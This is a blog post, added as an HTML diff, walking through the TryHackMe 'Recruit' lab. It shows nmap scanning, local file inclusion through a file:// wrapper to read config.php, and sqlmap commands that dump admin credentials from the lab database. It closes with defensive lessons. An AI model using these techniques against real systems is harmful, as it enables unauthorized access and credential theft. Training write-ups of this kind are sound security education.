@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Recruit Writeup — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="Complete walkthrough of the TryHackMe Recruit room covering enumeration, information disclosure, Local File Inclusion, SQL Injection, and administrator compromise.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-recruit-writeup/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="TryHackMe Recruit Writeup">
+  <meta property="og:description" content="Complete walkthrough of the TryHackMe Recruit room covering enumeration, information disclosure, Local File Inclusion, SQL Injection, and administrator compromise.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-recruit-writeup/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-08-10T01:53:36.088Z">
+  <meta property="article:tag" content="ctf">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="pentesting">
+  <meta property="article:tag" content="attack-techniques">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Recruit Writeup">
+  <meta name="twitter:description" content="Complete walkthrough of the TryHackMe Recruit room covering enumeration, information disclosure, Local File Inclusion, SQL Injection, and administrator compromise.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe Recruit Writeup","description":"Complete walkthrough of the TryHackMe Recruit room covering enumeration, information disclosure, Local File Inclusion, SQL Injection, and administrator compromise.","datePublished":"2026-08-10T01:53:36.088Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/tryhackme-recruit-writeup/","keywords":"ctf, web-security, pentesting, attack-techniques"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-tryhackme-recruit-writeup" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>TryHackMe Recruit Writeup</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 28-6-2026</span>
+        <span>·</span><span class="card-cat-chip">ctf</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">pentesting</span><span class="card-cat-chip">attack-techniques</span>
+      </div>
+      <p>Written By Aryan Giri</p>
+<h1>Recruit — TryHackMe Writeup</h1>
+<h2>Room Information</h2>
+<p><strong>Room:</strong> Recruit<br><strong>Difficulty:</strong> Easy<br><strong>Category:</strong> Web Security</p>
+<hr>
+<h2>Objective</h2>
+<p>Recruit has launched a new recruitment portal that allows HR staff to manage candidate applications while administrators oversee hiring decisions.</p>
+<p>Our goal is to assess the application from an attacker&#39;s perspective, identify exposed functionality, exploit vulnerabilities, gain an initial foothold, escalate privileges, and ultimately log in as the administrator.</p>
+<hr>
+<h1>Initial Enumeration</h1>
+<p>The target application is available at:</p>
+<pre><code class="language-text">http://10.49.139.46/
+</code></pre>
+<p>Upon visiting the website, we are presented with a login page.</p>
+<img width="1587" height="583" alt="Screenshot 2026-06-28 200323" src="https://github.com/user-attachments/assets/ee302cde-d341-423c-9a61-9e02c60f1c42" />
+
+<p>Rather than immediately attempting authentication, begin enumerating every piece of publicly accessible functionality.</p>
+<hr>
+<h1>Discovering the API Documentation</h1>
+<p>On the login page there is an <strong>API</strong> link.</p>
+<p>Clicking it redirects us to the API documentation.</p>
+<img width="831" height="434" alt="Screenshot 2026-06-28 210742" src="https://github.com/user-attachments/assets/19f87c79-7439-4b10-8d21-0fd466b4a253" />
+
+
+<p>The documentation exposes an interesting endpoint:</p>
+<pre><code class="language-text">/file.php?cv=&lt;URL&gt;
+</code></pre>
+<p>The documentation explains that this endpoint can fetch a candidate CV.</p>
+<p>Although it appears harmless, it is worth noting because endpoints accepting file paths or URLs often become attack surfaces.</p>
+<p>Keep this endpoint in mind.</p>
+<hr>
+<h1>Web Enumeration</h1>
+<p>Since we currently do not know any usernames or passwords, perform basic web enumeration.</p>
+<p>Running Nmap&#39;s vulnerability scripts:</p>
+<pre><code class="language-bash">nmap --script vuln 10.49.139.46 -p80
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-text">PORT   STATE SERVICE
+80/tcp open  http
+
+| http-cookie-flags:
+|   PHPSESSID:
+|_      httponly flag not set
+
+| http-enum:
+|   /mail/: Mail folder
+|_  /phpmyadmin/: phpMyAdmin
+
+| http-fileupload-exploiter:
+|_    Couldn&#39;t find a file-type field.
+
+|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
+|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
+</code></pre>
+<p>Although no critical vulnerability is discovered automatically, Nmap reveals two interesting directories:</p>
+<ul>
+<li><code>/phpmyadmin/</code></li>
+<li><code>/mail/</code></li>
+</ul>
+<p>The room objective doesn&#39;t involve phpMyAdmin, so we will ignore it for now.</p>
+<p>The <code>/mail/</code> directory looks much more interesting.</p>
+<hr>
+<h1>Inspecting the Mail Directory</h1>
+<p>Browse to:</p>
+<pre><code class="language-text">http://10.49.139.46/mail/
+</code></pre>
+<p>A <code>mail.log</code> file is present.</p>
+<img width="647" height="434" alt="Screenshot 2026-06-28 201853" src="https://github.com/user-attachments/assets/3aa963b0-4ff0-42a7-b3a0-5866f10c94ac" />
+
+
+<p>Opening the file reveals an internal email:</p>
+<pre><code class="language-text">From: HR Team &lt;hr@recruit.thm&gt;
+To: IT Support &lt;it-support@recruit.thm&gt;
+Date: Tue, 14 May 2024 09:32:10 +0000
+Subject: Recruitment Portal Deployment Confirmation
+
+Hi Team,
+
+Just a quick update to confirm that the new Recruitment Portal
+has been deployed successfully and is functioning as expected.
+
+We&#39;ve completed basic validation:
+- Login page is accessible
+- Candidate dashboard loads correctly
+- API documentation page is live
+
+As discussed during deployment:
+
+- HR login credentials (username: **hr**) are currently stored in the application
+  configuration file (**config.php**) for ease of access during
+  the initial rollout phase.
+
+- Administrator credentials are NOT stored in the application
+  files and are securely maintained within the backend database.
+
+Please let us know if there are any issues or if further changes
+are required.
+</code></pre>
+<p>Two extremely valuable pieces of information are leaked:</p>
+<ul>
+<li><strong>Username:</strong> <code>hr</code></li>
+<li><strong>Password Location:</strong> <code>config.php</code></li>
+</ul>
+<p>This immediately reminds us of the endpoint discovered earlier:</p>
+<pre><code class="language-text">/file.php?cv=&lt;URL&gt;
+</code></pre>
+<hr>
+<h1>Exploiting Local File Inclusion</h1>
+<p>Attempting to retrieve the configuration file directly:</p>
+<pre><code class="language-bash">curl http://10.49.139.46/file.php?cv=config.php
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-text">Only local files are allowed
+</code></pre>
+<p>This tells us that the endpoint is attempting to restrict remote resources.</p>
+<p>However, the application accepts local file wrappers.</p>
+<p>Using the <code>file://</code> wrapper:</p>
+<pre><code class="language-bash">curl http://10.49.139.46/file.php?cv=file://config.php
+</code></pre>
+<p>Response:</p>
+<pre><code class="language-php">$APP_NAME        = &#39;Recruit&#39;;
+$APP_ENV         = &#39;production&#39;;
+$APP_VERSION     = &#39;1.2.4&#39;;
+
+...
+
+$HR_PASSWORD = &#39;**hrpassword123**&#39;;
+</code></pre>
+<p>The Local File Inclusion vulnerability successfully exposes the application configuration.</p>
+<p>We now have:</p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>hr</td>
+<td><strong>hrpassword123</strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h1>Initial Access</h1>
+<p>Using the recovered credentials:</p>
+<pre><code class="language-text">Username: hr
+Password: hrpassword123
+</code></pre>
+<p>we can successfully authenticate as the HR user.</p>
+<p>After login, the HR dashboard becomes accessible.</p>
+<img width="1571" height="655" alt="Screenshot 2026-06-28 203549" src="https://github.com/user-attachments/assets/0d774db7-d7d0-47c0-9ebe-abf1181296d4" />
+
+
+<p>The room provides the first flag here (hidden in screenshots to comply with TryHackMe policies).</p>
+<hr>
+<h1>Looking for Privilege Escalation</h1>
+<p>Our objective is now to become the administrator.</p>
+<p>Exploring the dashboard reveals:</p>
+<ul>
+<li>Candidate listing</li>
+<li>Search functionality</li>
+</ul>
+<p>Initially, several possibilities were tested:</p>
+<ul>
+<li>IDOR</li>
+<li>Cookie manipulation</li>
+<li>Parameter tampering</li>
+</ul>
+<p>None produced useful results.</p>
+<p>Next, test the search field for SQL Injection by entering:</p>
+<pre><code class="language-text">&#39;
+</code></pre>
+<img width="1434" height="202" alt="Screenshot 2026-06-28 203857" src="https://github.com/user-attachments/assets/78fedec4-a324-4760-904d-62ad21955556" />
+
+<p>Instead of a normal response, the application returns an SQL error.</p>
+<p>This is a strong indication that user input is reaching the database without proper sanitization.</p>
+<hr>
+<h1>Exploiting SQL Injection</h1>
+<p>This vulnerability can be exploited manually or automatically.</p>
+<p>For this room, SQLMap is significantly faster.</p>
+<hr>
+<h2>Capturing the Request</h2>
+<p>Instead of manually copying cookies into SQLMap using <code>--cookie</code>, we can simply use the <code>-r</code> option.</p>
+<h3>Configure Firefox</h3>
+<p>If Burp Suite is not already configured:</p>
+<ol>
+<li>Open Firefox Settings</li>
+<li>Search for <strong>Proxy</strong></li>
+<li>Open <strong>Network Settings</strong></li>
+<li>Select <strong>Manual Proxy Configuration</strong></li>
+<li>Set:</li>
+</ol>
+<pre><code>HTTP Proxy:
+127.0.0.1
+
+Port:
+8080
+</code></pre>
+<p>This forwards browser traffic through Burp Suite.</p>
+<hr>
+<h2>Save the Request</h2>
+<p>Search for any value (for example <code>1</code>) inside the application&#39;s search box.</p>
+<p>The request appears inside Burp.</p>
+<p>Navigate to:</p>
+<pre><code>Proxy
+→ HTTP History
+</code></pre>
+<p>Right-click the request:</p>
+<pre><code>Save Item
+</code></pre>
+<p>Save it as:</p>
+<pre><code class="language-text">req
+</code></pre>
+<img width="773" height="641" alt="Screenshot 2026-06-28 204940" src="https://github.com/user-attachments/assets/e217bf37-52f8-4768-8a4b-882d90ac383f" />
+
+
+<hr>
+<h1>Enumerating Databases</h1>
+<p>Run:</p>
+<pre><code class="language-bash">sqlmap -r req --dbs
+</code></pre>
+<p>Result:</p>
+<pre><code class="language-text">available databases
+
+information_schema
+mysql
+performance_schema
+phpmyadmin
+recruit_db
+sys
+</code></pre>
+<p>Earlier, the leaked email mentioned that administrator credentials are stored inside the backend database.</p>
+<p>The most relevant database is:</p>
+<pre><code class="language-text">recruit_db
+</code></pre>
+<hr>
+<h1>Enumerating Tables</h1>
+<pre><code class="language-bash">sqlmap -r req -D recruit_db --tables
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-text">+------------+
+| candidates |
+| users      |
++------------+
+</code></pre>
+<p>The <code>users</code> table is the obvious target.</p>
+<hr>
+<h1>Enumerating Columns</h1>
+<pre><code class="language-bash">sqlmap -r req -D recruit_db -T users --columns
+</code></pre>
+<p>Output:</p>
+<pre><code class="language-text">+----------+--------------+
+| id       | int          |
+| password | varchar(100) |
+| username | varchar(50)  |
++----------+--------------+
+</code></pre>
+<hr>
+<h1>Dumping Credentials</h1>
+<p>Dump users:</p>
+<pre><code class="language-bash">sqlmap -r req -D recruit_db -T users --dump
+</code></pre>
+<p>Result:</p>
+<pre><code class="language-text">+----------+
+| username |
++----------+
+| admin    |
++----------+
+</code></pre>
+<p>Dump password :</p>
+<pre><code class="language-bash">sqlmap -r req -D recruit_db -T users -C password --dump
+</code></pre>
+<p>Result:</p>
+<pre><code class="language-bash">+----------------+
+| password       |
++----------------+
+| admin@001admin |
++----------------+
+</code></pre>
+<p>Administrator credentials recovered:</p>
+<pre><code class="language-text">Username: admin
+Password: admin@001admin
+</code></pre>
+<hr>
+<h1>Administrator Access</h1>
+<p>Authenticate using the recovered credentials.</p>
+<pre><code class="language-text">Username: admin
+Password: admin@001admin
+</code></pre>
+<p>The administrator dashboard is now accessible.</p>
+<p>The final flag is displayed after successful login.</p>
+<img width="1565" height="648" alt="Screenshot 2026-06-28 210122" src="https://github.com/user-attachments/assets/f4463903-9a8f-4de9-b2f3-fe5c7974ff81" />
+
+
+<hr>
+<h1>Attack Chain Summary</h1>
+<pre><code class="language-text">Anonymous User
+        │
+        ▼
+API Documentation Disclosure
+        │
+        ▼
+Discover /file.php?cv=&lt;URL&gt;
+        │
+        ▼
+Directory Enumeration
+        │
+        ▼
+Expose mail.log
+        │
+        ▼
+Leak username (hr)
+Leak password location (config.php)
+        │
+        ▼
+LFI using file:// wrapper
+        │
+        ▼
+Read config.php
+        │
+        ▼
+Recover HR Password
+        │
+        ▼
+Login as HR
+        │
+        ▼
+SQL Injection in Search
+        │
+        ▼
+SQLMap Enumeration
+        │
+        ▼
+Dump users Table
+        │
+        ▼
+Recover Admin Credentials
+        │
+        ▼
+Login as Administrator
+</code></pre>
+<h1>Vulnerabilities Identified</h1>
+<table>
+<thead>
+<tr>
+<th>Vulnerability</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Information Disclosure</td>
+<td>API documentation exposes internal functionality</td>
+</tr>
+<tr>
+<td>Directory Enumeration</td>
+<td>Exposed mail directory leaks sensitive operational emails</td>
+</tr>
+<tr>
+<td>Local File Inclusion (LFI)</td>
+<td>Reads application configuration and secrets</td>
+</tr>
+<tr>
+<td>Hardcoded Credentials</td>
+<td>HR password stored inside configuration file</td>
+</tr>
+<tr>
+<td>SQL Injection</td>
+<td>Database enumeration and credential extraction</td>
+</tr>
+<tr>
+<td>Excessive Information Exposure</td>
+<td>Internal deployment information aids attackers</td>
+</tr>
+</tbody></table>
+<h1>Lessons Learned</h1>
+<ul>
+<li>Never expose internal deployment emails through publicly accessible directories.</li>
+<li>Configuration files should never contain plaintext credentials.</li>
+<li>File retrieval endpoints must strictly validate file paths and reject dangerous wrappers such as <code>file://</code>.</li>
+<li>Parameterized queries should be used to prevent SQL Injection.</li>
+<li>Public API documentation should avoid exposing implementation details that assist attackers.</li>
+</ul>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
